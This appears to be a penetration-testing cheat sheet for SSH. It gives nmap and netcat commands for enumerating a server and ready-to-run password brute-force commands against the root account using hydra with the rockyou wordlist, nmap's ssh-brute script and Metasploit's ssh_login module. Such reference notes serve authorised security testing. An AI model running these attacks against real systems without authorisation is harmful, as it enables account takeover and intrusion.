---
title: "SSH"
description: ">-"
---




:::note
Default port: **22**
:::

### Enum

```bash
# Get versions
nmap $IP -p 22 -sV -O

# See welcome msg
nc $IP 22

# Get algorithms
nmap $IP -p 22 --script ssh2-enum-algos

# Get public Key
nmap $IP -p 22 --script ssh-hostkey --script-args ssh_hostkey=full

# Weak passwords
nmap $IP -p 22 --script ssh-auth-methods --script-args="ssh.user=root"
```

## Bruteforce with hydra

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $IP ssh
```

## Common password with nmap

```bash
nmap $IP --script ssh-brute --script-args userdb=/path/to/users -p 22
```

## Metasploit

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set rhosts $IP
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
run
```
